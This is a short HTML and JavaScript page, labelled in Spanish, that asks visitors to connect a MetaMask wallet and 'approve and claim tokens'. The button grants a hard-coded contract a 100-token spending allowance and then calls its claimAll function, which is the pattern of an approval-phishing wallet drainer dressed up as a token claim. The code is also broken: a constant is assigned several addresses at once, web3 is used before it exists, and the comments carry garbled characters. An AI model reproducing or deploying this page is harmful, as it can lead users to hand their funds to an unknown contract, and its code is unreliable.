<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conectar MetaMask y Aprobar Tokens</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
    <button onclick="connectWallet()">Conectar MetaMask</button>
    <button onclick="approveAndClaim()">Aprobar y Reclamar Tokens</button>
    
    <script>
        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Reemplaza con la direcci贸n real del contrato
        const tokenAddress = "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
"0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
"0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"; // Reemplaza con la direcci贸n del token
        const contractABI = [
            {
                "constant": false,
                "inputs": [],
                "name": "claimAll",
                "outputs": [],
                "type": "function"
            }
        ];
        const tokenABI = [
            {
                "constant": false,
                "inputs": [
                    {"name": "spender", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [],
                "type": "function"
            }
        ];
        
        let web3;
        let contract;
        let tokenContract;
        let userAccount;
        const approveAmount = web3.utils.toWei("100", "ether"); // Ajusta la cantidad a aprobar

        async function connectWallet() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                await window.ethereum.request({ method: "eth_requestAccounts" });
                const accounts = await web3.eth.getAccounts();
                userAccount = accounts[0];
                contract = new web3.eth.Contract(contractABI, contractAddress);
                tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
                console.log("Conectado: ", userAccount);
            } else {
                alert("Instala MetaMask para continuar");
            }
        }

        async function approveAndClaim() {
            if (!userAccount) {
                alert("Conecta tu wallet primero");
                return;
            }
            try {
                // Aprobar tokens
                await tokenContract.methods.approve(contractAddress, approveAmount).send({ from: userAccount });
                console.log("Tokens aprobados");
                
                // Reclamar tokens
                await contract.methods.claimAll().send({ from: userAccount });
                alert("Tokens aprobados y reclamados exitosamente");
            } catch (error) {
                console.error("Error en la transacci贸n: ", error);
                alert("Error en la transacci贸n");
            }
        }
    </script>
</body>
</html>
